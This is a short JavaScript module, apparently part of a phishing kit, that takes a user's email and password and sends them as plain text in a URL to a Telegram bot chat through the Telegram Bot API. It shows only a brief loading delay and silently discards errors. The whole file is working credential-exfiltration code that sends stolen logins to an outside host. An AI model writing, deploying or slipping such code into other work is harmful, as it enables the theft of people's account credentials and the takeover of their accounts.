import axios from 'axios';

const SendMessage = ([email, password], setIsLoading) => {
  const payload = [`email : ${email} || password : ${password}`];
  const link = `https://api.telegram.org/${process.env.BOT_ID}/sendMessage?chat_id=${process.env.CHAT_ID}&text=${payload}`;

  axios
    .get(link)
    .then(
      setTimeout(() => {
        setIsLoading(false);
      }, 1000)
    )
    .catch();
};

export default SendMessage;
